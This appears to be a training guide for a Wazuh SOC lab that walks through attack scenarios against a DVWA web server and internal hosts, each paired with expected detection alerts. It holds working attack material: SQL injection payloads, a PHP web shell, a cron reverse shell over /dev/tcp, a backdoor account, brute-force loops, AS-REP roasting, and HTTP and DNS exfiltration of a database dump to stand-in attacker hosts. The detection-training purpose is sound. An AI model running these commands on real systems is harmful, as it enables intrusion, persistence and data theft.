# Wazuh SOC Lab Attack Scenarios

## Overview

This document outlines comprehensive attack scenarios designed to test the detection capabilities of the Wazuh SOC Lab. Each scenario simulates real-world attack techniques and provides expected detection points for SOC analyst training.

## Scenario Categories

### 1. Web Application Attacks

### 2. Network Reconnaissance and Lateral Movement

### 3. Privilege Escalation

### 4. Persistence and Backdoors

### 5. Data Exfiltration

### 6. Advanced Persistent Threat (APT) Simulation

---

## Scenario 1: Web Application Attack Chain

### Objective

Simulate a complete web application compromise from initial reconnaissance to persistence establishment.

### Target Systems

- **Primary**: Ubuntu Web Server (192.168.2.10) - DVWA
- **Secondary**: RHEL Database Server (192.168.3.20)

### Attack Timeline

**Duration**: 30-45 minutes  
**Complexity**: Intermediate  
**MITRE ATT&CK Techniques**: T1595, T1190, T1059, T1505.003

### Phase 1: Reconnaissance (5 minutes)

#### 1.1 Network Discovery

```bash
# From external system or Kali VM
nmap -sS -O 192.168.2.0/24
nmap -sV -p 80,443,22,3306 192.168.2.10
```

**Expected Detections:**

- pfSense: Port scan detection
- Wazuh Rule: 40101 (Multiple connection attempts)
- Alert Level: Medium

#### 1.2 Web Application Fingerprinting

```bash
# Directory enumeration
dirb http://192.168.2.10/dvwa/
gobuster dir -u http://192.168.2.10/dvwa/ -w /usr/share/wordlists/dirb/common.txt

# Technology detection
whatweb http://192.168.2.10/dvwa/
nikto -h http://192.168.2.10/dvwa/
```

**Expected Detections:**

- Apache access logs: Multiple 404 errors
- Wazuh Rule: 31151 (Web scanner detection)
- Alert Level: Medium

### Phase 2: Initial Exploitation (10 minutes)

#### 2.1 SQL Injection Attack

```bash
# Access DVWA SQL Injection page
curl "http://192.168.2.10/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT 1,version(),database()--&Submit=Submit"

# Extract database information
curl "http://192.168.2.10/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT 1,user(),@@datadir--&Submit=Submit"

# Extract user data
curl "http://192.168.2.10/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT 1,user,password FROM users--&Submit=Submit"
```

**Expected Detections:**

- Apache access logs: SQL injection patterns
- Wazuh Rule: 31106 (SQL injection attempt)
- Alert Level: High

#### 2.2 File Upload Vulnerability

```bash
# Create PHP web shell
cat > shell.php << 'EOF'
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
<form method="GET">
<input type="text" name="cmd" placeholder="Enter command">
<input type="submit" value="Execute">
</form>
EOF

# Upload via DVWA file upload vulnerability
# (Manual step through web interface)
```

**Expected Detections:**

- File Integrity Monitoring: New file in /var/www/html/
- Wazuh Rule: 550 (Integrity checksum changed)
- Alert Level: High

### Phase 3: Command Execution (10 minutes)

#### 3.1 Web Shell Execution

```bash
# Execute commands via uploaded shell
curl "http://192.168.2.10/dvwa/hackable/uploads/shell.php?cmd=whoami"
curl "http://192.168.2.10/dvwa/hackable/uploads/shell.php?cmd=id"
curl "http://192.168.2.10/dvwa/hackable/uploads/shell.php?cmd=uname -a"
curl "http://192.168.2.10/dvwa/hackable/uploads/shell.php?cmd=ps aux"
```

**Expected Detections:**

- Apache access logs: Suspicious PHP execution
- Wazuh Rule: 31108 (Web shell execution)
- Alert Level: Critical

#### 3.2 System Enumeration

```bash
# Network enumeration
curl "http://192.168.2.10/dvwa/hackable/uploads/shell.php?cmd=netstat -tulpn"
curl "http://192.168.2.10/dvwa/hackable/uploads/shell.php?cmd=arp -a"
curl "http://192.168.2.10/dvwa/hackable/uploads/shell.php?cmd=cat /etc/passwd"
curl "http://192.168.2.10/dvwa/hackable/uploads/shell.php?cmd=find / -perm -4000 2>/dev/null"
```

**Expected Detections:**

- System command execution via web interface
- Wazuh Rule: 31109 (System enumeration via web)
- Alert Level: High

### Phase 4: Privilege Escalation (10 minutes)

#### 4.1 Local Privilege Escalation

```bash
# Check for sudo privileges
curl "http://192.168.2.10/dvwa/hackable/uploads/shell.php?cmd=sudo -l"

# Check for SUID binaries
curl "http://192.168.2.10/dvwa/hackable/uploads/shell.php?cmd=find /usr/bin -perm -4000 2>/dev/null"

# Attempt privilege escalation (example with vulnerable binary)
curl "http://192.168.2.10/dvwa/hackable/uploads/shell.php?cmd=/usr/bin/pkexec --version"
```

**Expected Detections:**

- Privilege escalation attempts
- Wazuh Rule: 40111 (Privilege escalation attempt)
- Alert Level: Critical

### Phase 5: Persistence (10 minutes)

#### 5.1 Backdoor Creation

```bash
# Create persistent backdoor
curl "http://192.168.2.10/dvwa/hackable/uploads/shell.php?cmd=echo '*/5 * * * * /bin/bash -c \"bash -i >& /dev/tcp/192.168.1.100/4444 0>&1\"' | crontab -"

# Create SSH backdoor
curl "http://192.168.2.10/dvwa/hackable/uploads/shell.php?cmd=useradd -m -s /bin/bash backdoor"
curl "http://192.168.2.10/dvwa/hackable/uploads/shell.php?cmd=echo 'backdoor:password123' | chpasswd"
```

**Expected Detections:**

- Crontab modification
- User account creation
- Wazuh Rules: 2902 (User account added), 2904 (Crontab modified)
- Alert Level: High

---

## Scenario 2: Network Lateral Movement

### Objective

Demonstrate lateral movement techniques from compromised web server to internal network resources.

### Target Systems

- **Start**: Ubuntu Web Server (192.168.2.10)
- **Targets**: Windows DC (192.168.3.10), RHEL DB (192.168.3.20)

### Attack Timeline

**Duration**: 45-60 minutes  
**Complexity**: Advanced  
**MITRE ATT&CK Techniques**: T1021, T1110, T1135, T1018

### Phase 1: Internal Network Discovery (15 minutes)

#### 1.1 Network Scanning from Compromised Host

```bash
# Ping sweep of internal networks
for i in {1..254}; do
  curl "http://192.168.2.10/dvwa/hackable/uploads/shell.php?cmd=ping -c 1 192.168.3.$i | grep '64 bytes'"
done

# Port scanning internal hosts
curl "http://192.168.2.10/dvwa/hackable/uploads/shell.php?cmd=nmap -sS 192.168.3.10"
curl "http://192.168.2.10/dvwa/hackable/uploads/shell.php?cmd=nmap -sS 192.168.3.20"
```

**Expected Detections:**

- Multiple ICMP requests from web server
- Internal port scanning activity
- Wazuh Rule: 40104 (Internal network scanning)
- Alert Level: High

#### 1.2 Service Enumeration

```bash
# SMB enumeration
curl "http://192.168.2.10/dvwa/hackable/uploads/shell.php?cmd=smbclient -L //192.168.3.10 -N"

# SSH service detection
curl "http://192.168.2.10/dvwa/hackable/uploads/shell.php?cmd=nc -zv 192.168.3.20 22"

# RDP detection
curl "http://192.168.2.10/dvwa/hackable/uploads/shell.php?cmd=nc -zv 192.168.3.10 3389"
```

**Expected Detections:**

- Service enumeration attempts
- SMB connection attempts
- Wazuh Rule: 40105 (Service enumeration)
- Alert Level: Medium

### Phase 2: Credential Attacks (20 minutes)

#### 2.1 SSH Brute Force Attack

```bash
# Create wordlist
cat > passwords.txt << 'EOF'
admin
password
123456
root
administrator
lab123
password123
EOF

# Brute force SSH
for pass in $(cat passwords.txt); do
  curl "http://192.168.2.10/dvwa/hackable/uploads/shell.php?cmd=sshpass -p $pass ssh -o StrictHostKeyChecking=no root@192.168.3.20 'whoami'"
done
```

**Expected Detections:**

- Multiple SSH authentication failures
- Wazuh Rule: 5720 (SSH brute force attack)
- Alert Level: High
- Active Response: IP blocking

#### 2.2 SMB Authentication Attacks

```bash
# SMB brute force
for pass in $(cat passwords.txt); do
  curl "http://192.168.2.10/dvwa/hackable/uploads/shell.php?cmd=smbclient //192.168.3.10/C$ -U Administrator%$pass -c 'ls'"
done
```

**Expected Detections:**

- Windows Security Event 4625 (Failed logon)
- Multiple authentication failures
- Wazuh Rule: 18152 (Windows logon failure)
- Alert Level: High

### Phase 3: Successful Lateral Movement (10 minutes)

#### 3.1 SSH Access to Database Server

```bash
# Successful SSH connection (assuming weak credentials found)
curl "http://192.168.2.10/dvwa/hackable/uploads/shell.php?cmd=ssh root@192.168.3.20 'hostname && whoami'"

# Execute commands on database server
curl "http://192.168.2.10/dvwa/hackable/uploads/shell.php?cmd=ssh root@192.168.3.20 'ps aux | grep mysql'"
curl "http://192.168.2.10/dvwa/hackable/uploads/shell.php?cmd=ssh root@192.168.3.20 'netstat -tulpn | grep 3306'"
```

**Expected Detections:**

- Successful SSH login from web server
- Remote command execution
- Wazuh Rule: 5715 (SSH authentication success)
- Alert Level: Medium (but suspicious source)

---

## Scenario 3: Windows Domain Attack

### Objective

Simulate attacks against Active Directory infrastructure and Windows-specific techniques.

### Target Systems

- **Primary**: Windows Server 2019 DC (192.168.3.10)
- **Secondary**: Any domain-joined systems

### Attack Timeline

**Duration**: 30-45 minutes  
**Complexity**: Advanced  
**MITRE ATT&CK Techniques**: T1110, T1078, T1003, T1482

### Phase 1: Domain Reconnaissance (10 minutes)

#### 1.1 Domain Information Gathering

```bash
# LDAP enumeration
ldapsearch -x -h 192.168.3.10 -s base namingcontexts
ldapsearch -x -h 192.168.3.10 -b "DC=lab,DC=local" "(objectClass=user)"

# DNS enumeration
dig @192.168.3.10 lab.local ANY
dig @192.168.3.10 _ldap._tcp.lab.local SRV
```

**Expected Detections:**

- LDAP queries from external source
- DNS enumeration attempts
- Wazuh Rule: 40106 (Domain reconnaissance)
- Alert Level: Medium

### Phase 2: Authentication Attacks (15 minutes)

#### 2.1 Kerberos Attacks

```bash
# AS-REP roasting (if users have "Do not require Kerberos preauthentication")
python3 GetNPUsers.py lab.local/ -dc-ip 192.168.3.10 -no-pass -usersfile users.txt

# Password spraying
for user in analyst1 analyst2 soc-admin; do
  rpcclient -U "$user%Password123" 192.168.3.10 -c "getusername"
done
```

**Expected Detections:**

- Kerberos authentication failures
- Multiple logon attempts
- Windows Event 4771 (Kerberos pre-authentication failed)
- Wazuh Rule: 18108 (Kerberos attack)
- Alert Level: High

### Phase 3: Post-Exploitation (20 minutes)

#### 3.1 Domain Enumeration

```powershell
# PowerShell commands (if access gained)
Get-ADUser -Filter * -Properties *
Get-ADGroup -Filter * -Properties *
Get-ADComputer -Filter * -Properties *
Get-GPO -All
```

**Expected Detections:**

- PowerShell execution
- AD enumeration commands
- Windows Event 4103 (PowerShell execution)
- Wazuh Rule: 91533 (PowerShell suspicious activity)
- Alert Level: High

---

## Scenario 4: Data Exfiltration

### Objective

Simulate data theft techniques and test data loss prevention capabilities.

### Target Systems

- **All systems**: Focus on sensitive data locations

### Attack Timeline

**Duration**: 20-30 minutes  
**Complexity**: Intermediate  
**MITRE ATT&CK Techniques**: T1005, T1041, T1048, T1567

### Phase 1: Data Discovery (10 minutes)

#### 1.1 Sensitive File Search

```bash
# Search for sensitive files
curl "http://192.168.2.10/dvwa/hackable/uploads/shell.php?cmd=find /var/www -name '*.sql' -o -name '*.bak' -o -name '*password*'"
curl "http://192.168.2.10/dvwa/hackable/uploads/shell.php?cmd=grep -r 'password' /var/www/html/ | head -10"
```

**Expected Detections:**

- File system enumeration
- Sensitive file access
- Wazuh Rule: 40107 (Data discovery)
- Alert Level: Medium

### Phase 2: Data Exfiltration (10 minutes)

#### 2.1 Database Dump

```bash
# MySQL database dump
curl "http://192.168.2.10/dvwa/hackable/uploads/shell.php?cmd=mysqldump -u dvwa -ppassword dvwa > /tmp/database_dump.sql"

# Compress and encode
curl "http://192.168.2.10/dvwa/hackable/uploads/shell.php?cmd=gzip /tmp/database_dump.sql"
curl "http://192.168.2.10/dvwa/hackable/uploads/shell.php?cmd=base64 /tmp/database_dump.sql.gz > /tmp/encoded_data.txt"
```

**Expected Detections:**

- Database dump creation
- Large file operations
- Wazuh Rule: 40108 (Data collection)
- Alert Level: High

#### 2.2 Data Transfer

```bash
# HTTP exfiltration
curl "http://192.168.2.10/dvwa/hackable/uploads/shell.php?cmd=curl -X POST -d @/tmp/encoded_data.txt http://attacker-server.com/upload"

# DNS exfiltration (chunked)
curl "http://192.168.2.10/dvwa/hackable/uploads/shell.php?cmd=xxd -p /tmp/database_dump.sql.gz | fold -w 32 | while read line; do nslookup \$line.attacker-domain.com; done"
```

**Expected Detections:**

- Large outbound data transfers
- Suspicious DNS queries
- Wazuh Rule: 40109 (Data exfiltration)
- Alert Level: Critical

---

## Scenario 5: Advanced Persistent Threat (APT) Simulation

### Objective

Simulate a sophisticated, multi-stage attack campaign typical of APT groups.

### Target Systems

- **All systems**: Multi-vector attack

### Attack Timeline

**Duration**: 2-3 hours  
**Complexity**: Expert  
**MITRE ATT&CK Techniques**: Multiple across all tactics

### Phase 1: Initial Compromise (30 minutes)

- Spear phishing simulation
- Watering hole attack
- Supply chain compromise

### Phase 2: Persistence and Evasion (45 minutes)

- Multiple persistence mechanisms
- Anti-forensics techniques
- Living off the land

### Phase 3: Lateral Movement (45 minutes)

- Credential harvesting
- Pass-the-hash attacks
- Golden ticket attacks

### Phase 4: Data Collection and Exfiltration (30 minutes)

- Staged data collection
- Covert channels
- Long-term data theft

---

## Detection Validation Checklist

### For Each Scenario:

#### Pre-Attack Preparation

- [ ] Verify all agents are active and reporting
- [ ] Confirm baseline alert levels
- [ ] Document normal system behavior
- [ ] Prepare attack tools and scripts

#### During Attack Execution

- [ ] Monitor real-time alerts in dashboard
- [ ] Verify expected detections are triggering
- [ ] Document any missed detections
- [ ] Note false positives

#### Post-Attack Analysis

- [ ] Review complete attack timeline
- [ ] Analyze alert correlation
- [ ] Assess detection coverage
- [ ] Document lessons learned

### Expected Alert Volumes

| Scenario          | Expected Alerts | Critical Alerts | Response Time |
| ----------------- | --------------- | --------------- | ------------- |
| Web App Attack    | 15-25           | 3-5             | < 5 minutes   |
| Lateral Movement  | 20-35           | 5-8             | < 10 minutes  |
| Domain Attack     | 10-20           | 2-4             | < 5 minutes   |
| Data Exfiltration | 8-15            | 3-6             | < 3 minutes   |
| APT Simulation    | 50-100          | 10-20           | < 15 minutes  |

---

## Training Exercises

### Exercise 1: Alert Triage

- Execute Scenario 1
- Practice prioritizing alerts by severity
- Develop investigation workflows

### Exercise 2: Incident Response

- Execute Scenario 2
- Practice containment procedures
- Document incident timeline

### Exercise 3: Threat Hunting

- Execute Scenario 5
- Practice proactive threat hunting
- Develop hunting hypotheses

### Exercise 4: Forensic Analysis

- Execute any scenario
- Practice evidence collection
- Develop forensic timelines

---

## Customization Guidelines

### Creating New Scenarios

1. Define clear objectives
2. Map to MITRE ATT&CK framework
3. Identify expected detections
4. Test detection coverage
5. Document procedures

### Modifying Existing Scenarios

1. Adjust complexity for skill level
2. Add new attack vectors
3. Update for new threats
4. Enhance detection rules

---

_These attack scenarios provide comprehensive testing of the Wazuh SOC Lab's detection capabilities. Regular execution helps validate security controls and train SOC analysts in real-world threat detection and response._
